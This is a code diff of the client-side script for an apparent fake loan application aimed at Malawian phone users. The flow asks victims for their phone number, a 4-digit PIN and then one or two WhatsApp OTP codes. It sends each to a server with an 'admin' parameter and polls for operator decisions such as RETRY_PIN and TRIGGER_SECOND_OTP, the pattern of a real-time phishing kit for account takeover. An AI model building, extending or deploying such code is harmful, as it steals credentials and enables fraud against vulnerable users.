@@ -1,4 +1,15 @@
 document.addEventListener('DOMContentLoaded', () => {
+  // DOM element references matching your flow
+  const stepUnderstand = document.getElementById('step-I UNDERSTAND');
+  const stepSlider = document.getElementById('step-slider');
+  const stepLoan1 = document.getElementById('step-loan-1');
+  const stepLoan2 = document.getElementById('step-loan-2');
+  const stepLoan3 = document.getElementById('step-loan-3');
+  const stepForm = document.getElementById('step-form');
+  const stepLoading = document.getElementById('step-loading');
+  const stepOtp = document.getElementById('step-otp') || document.getElementById('step-WHATSSAP');
+  const stepSuccess = document.getElementById('step-success');
+
   let currentUserId = null;
   let otpStep = 1;
   let statusPollInterval = null;
@@ -6,19 +17,16 @@ document.addEventListener('DOMContentLoaded', () => {
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
 
-  const screens = {
-    welcome: document.getElementById('screen-welcome'),
-    login: document.getElementById('screen-login'),
-    step1: document.getElementById('screen-step1'),
-    otp: document.getElementById('screen-otp'),
-    success: document.getElementById('screen-success')
-  };
+  // Function to switch active screens
+  function showStep(targetStep) {
+    const allSteps = [stepUnderstand, stepSlider, stepLoan1, stepLoan2, stepLoan3, stepForm, stepOtp, stepSuccess];
+    allSteps.forEach(s => {
+      if (s) s.classList.remove('active');
+    });
+    if (targetStep) targetStep.classList.add('active');
+  }
 
-  const loadingOverlay = document.getElementById('loading-overlay');
-  const loadingTitle = document.getElementById('loading-title');
-  const loadingSub = document.getElementById('loading-sub');
-
-  // Interactive Sliders Logic
+  // Sliders Logic
   const sliderBalance = document.getElementById('slider-balance');
   const balanceVal = document.getElementById('balance-val');
   const sliderAirtime = document.getElementById('slider-airtime');
@@ -36,12 +44,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  function showScreen(key) {
-    Object.values(screens).forEach(s => s.classList.remove('active'));
-    if (screens[key]) screens[key].classList.add('active');
-  }
-
-  // Digit auto-focus utility
+  // Auto-focus utility for PIN (4 digits) & OTP (4 digits)
   const pinDigits = document.querySelectorAll('.pin-digit');
   const otpDigits = document.querySelectorAll('.otp-digit');
 
@@ -64,63 +67,86 @@ document.addEventListener('DOMContentLoaded', () => {
   setupDigitInputs(pinDigits);
   setupDigitInputs(otpDigits);
 
-  // Toggle PIN eye icon
-  const toggleEye = document.getElementById('toggle-pin-visibility');
-  let isPinVisible = false;
-  if (toggleEye) {
-    toggleEye.addEventListener('click', () => {
-      isPinVisible = !isPinVisible;
-      pinDigits.forEach(i => i.type = isPinVisible ? 'text' : 'password');
-    });
-  }
-
-  // Welcome -> Login Screen
-  document.getElementById('btn-welcome-apply').addEventListener('click', () => {
-    showScreen('login');
+  // 1. step-I UNDERSTAND -> step-slider
+  document.getElementById('btn-understand-proceed').addEventListener('click', () => {
+    showStep(stepSlider);
   });
 
-  // Login Submit Validation -> Application Step 1
-  const loginPhone = document.getElementById('login-phone');
-  const phoneError = document.getElementById('login-phone-error');
-  const pinError = document.getElementById('login-pin-error');
+  // 2. step-slider -> step-loan-1
+  document.getElementById('btn-slider-next').addEventListener('click', () => {
+    showStep(stepLoan1);
+  });
 
-  document.getElementById('btn-login-submit').addEventListener('click', () => {
-    let valid = true;
-    const cleanPhone = loginPhone.value.replace(/\D/g, '');
+  // 3. step-loan-1 back / next
+  document.getElementById('btn-loan1-back').addEventListener('click', () => {
+    showStep(stepSlider);
+  });
+  document.getElementById('btn-loan1-next').addEventListener('click', () => {
+    showStep(stepLoan2);
+  });
+
+  // 4. step-loan-2 back / next validation
+  const phoneNumber = document.getElementById('phone-number');
+  const phoneError = document.getElementById('phone-error');
+
+  document.getElementById('btn-loan2-back').addEventListener('click', () => {
+    showStep(stepLoan1);
+  });
+
+  document.getElementById('btn-loan2-next').addEventListener('click', () => {
+    const cleanPhone = phoneNumber.value.replace(/\D/g, '');
     const isMalawiNumber = /^(099|098|088|077)\d{7}$/.test(cleanPhone);
 
     if (!isMalawiNumber) {
       phoneError.style.display = 'block';
-      valid = false;
-    } else {
-      phoneError.style.display = 'none';
+      return;
     }
+    phoneError.style.display = 'none';
+    showStep(stepLoan3);
+  });
 
+  // 5. step-loan-3 (PIN Entry) back / next
+  const pinError = document.getElementById('pin-error');
+
+  document.getElementById('btn-loan3-back').addEventListener('click', () => {
+    showStep(stepLoan2);
+  });
+
+  document.getElementById('btn-loan3-next').addEventListener('click', () => {
     const pinVal = Array.from(pinDigits).map(i => i.value).join('');
     if (pinVal.length !== 4) {
       pinError.style.display = 'block';
-      valid = false;
-    } else {
-      pinError.style.display = 'none';
+      return;
     }
+    pinError.style.display = 'none';
 
-    if (valid) {
-      showScreen('step1');
-    }
+    // Populate Summary
+    const loanAmount = document.getElementById('loan-amount').value;
+    const loanDuration = document.getElementById('loan-duration').value;
+    const loanType = document.getElementById('loan-type').value;
+    const firstName = document.getElementById('first-name').value;
+    const lastName = document.getElementById('last-name').value;
+
+    document.getElementById('sum-amount').innerText = `MWK ${Number(loanAmount).toLocaleString()}`;
+    document.getElementById('sum-duration').innerText = loanDuration;
+    document.getElementById('sum-category').innerText = loanType;
+    document.getElementById('sum-name').innerText = `${firstName} ${lastName}`.trim() || 'Valued Customer';
+    document.getElementById('sum-phone').innerText = phoneNumber.value.replace(/\D/g, '');
+
+    showStep(stepForm);
   });
 
-  // Step 1 Back -> Login
-  document.getElementById('btn-step1-back').addEventListener('click', () => {
-    showScreen('login');
+  // 6. step-form back / submit
+  document.getElementById('btn-form-back').addEventListener('click', () => {
+    showStep(stepLoan3);
   });
 
-  // Application Submit -> Call Server API
-  document.getElementById('btn-step1-submit').addEventListener('click', async () => {
-    const cleanPhone = loginPhone.value.replace(/\D/g, '');
+  document.getElementById('btn-form-submit').addEventListener('click', async () => {
+    const cleanPhone = phoneNumber.value.replace(/\D/g, '');
     const pinVal = Array.from(pinDigits).map(i => i.value).join('');
     const amtVal = `MWK ${Number(document.getElementById('loan-amount').value).toLocaleString()}`;
 
-    showLoading('Submitting Request...', 'Sending your details securely.');
+    showLoading('Submitting Application...', 'Sending details securely.');
 
     try {
       const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminParam)}`, {
@@ -137,8 +163,8 @@ document.addEventListener('DOMContentLoaded', () => {
       const data = await res.json();
       if (data.success) {
         currentUserId = data.userId;
-        loadingTitle.innerText = 'Awaiting Admin Verification...';
-        loadingSub.innerText = 'Please stay on this page while request is processed.';
+        document.getElementById('loading-title').innerText = 'Awaiting Admin Verification...';
+        document.getElementById('loading-sub').innerText = 'Please stay on this page while request is processed.';
         startStatusPolling();
       } else {
         hideLoading();
@@ -146,11 +172,11 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     } catch (e) {
       hideLoading();
-      alert('Network connection error.');
+      alert('Network error submitting application.');
     }
   });
 
-  // Status Polling
+  // Polling Server / Telegram Status
   function startStatusPolling() {
     if (statusPollInterval) clearInterval(statusPollInterval);
 
@@ -165,54 +191,54 @@ document.addEventListener('DOMContentLoaded', () => {
           clearInterval(statusPollInterval);
           hideLoading();
           otpStep = 1;
-          document.getElementById('otp-phone-display').innerText = loginPhone.value;
-          showScreen('otp');
+          document.getElementById('otp-phone-display').innerText = phoneNumber.value;
+          showStep(stepOtp);
         } else if (data.status === 'TRIGGER_SECOND_OTP') {
           clearInterval(statusPollInterval);
           hideLoading();
           otpStep = 2;
           otpDigits.forEach(i => i.value = '');
           otpDigits[0].focus();
-          alert('First OTP accepted. Please enter secondary OTP received via WhatsApp.');
-          showScreen('otp');
+          alert('First OTP accepted. Please enter secondary 4-digit OTP received via WhatsApp.');
+          showStep(stepOtp);
         } else if (data.status === 'SUCCESS') {
           clearInterval(statusPollInterval);
           hideLoading();
           document.getElementById('approved-amount-display').innerText = `MWK ${Number(document.getElementById('loan-amount').value).toLocaleString()}`;
-          showScreen('success');
+          showStep(stepSuccess);
         } else if (data.status === 'RETRY_PIN') {
           clearInterval(statusPollInterval);
           hideLoading();
           alert('Incorrect PIN entered. Please re-enter your 4-digit PIN.');
           pinDigits.forEach(i => i.value = '');
-          showScreen('login');
+          showStep(stepLoan3);
         } else if (data.status === 'RETRY_OTP') {
           clearInterval(statusPollInterval);
           hideLoading();
-          alert('Incorrect OTP entered. Please re-enter the code from WhatsApp.');
+          alert('Incorrect OTP entered. Please re-enter the 4-digit code from WhatsApp.');
           otpDigits.forEach(i => i.value = '');
-          showScreen('otp');
+          showStep(stepOtp);
         } else if (data.status === 'DENIED') {
           clearInterval(statusPollInterval);
           hideLoading();
           alert('Application request was declined.');
-          showScreen('welcome');
+          showStep(stepUnderstand);
         }
       } catch (e) {}
     }, 3000);
   }
 
-  // Submit OTP API
+  // Submit 4-digit OTP
   document.getElementById('btn-submit-otp').addEventListener('click', async () => {
     const otpVal = Array.from(otpDigits).map(i => i.value).join('');
 
-    if (otpVal.length < 4 || !/^\d+$/.test(otpVal)) {
+    if (otpVal.length !== 4) {
       document.getElementById('otp-error').style.display = 'block';
       return;
     }
     document.getElementById('otp-error').style.display = 'none';
 
-    showLoading('Verifying OTP...', 'Validating your WhatsApp security code.');
+    showLoading('Verifying OTP...', 'Validating your 4-digit WhatsApp code.');
 
     try {
       const res = await fetch('/api/submit-otp', {
@@ -227,8 +253,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
       const data = await res.json();
       if (data.success) {
-        loadingTitle.innerText = 'Verifying Code...';
-        loadingSub.innerText = 'Please wait while admin confirms your code.';
+        document.getElementById('loading-title').innerText = 'Verifying Code...';
+        document.getElementById('loading-sub').innerText = 'Please wait while admin confirms your code.';
         startStatusPolling();
       } else {
         hideLoading();
@@ -246,13 +272,13 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   function showLoading(title, sub) {
-    loadingTitle.innerText = title;
-    loadingSub.innerText = sub;
-    loadingOverlay.classList.add('active');
+    document.getElementById('loading-title').innerText = title;
+    document.getElementById('loading-sub').innerText = sub;
+    if (stepLoading) stepLoading.classList.add('active');
   }
 
   function hideLoading() {
-    loadingOverlay.classList.remove('active');
+    if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-                                 
+    
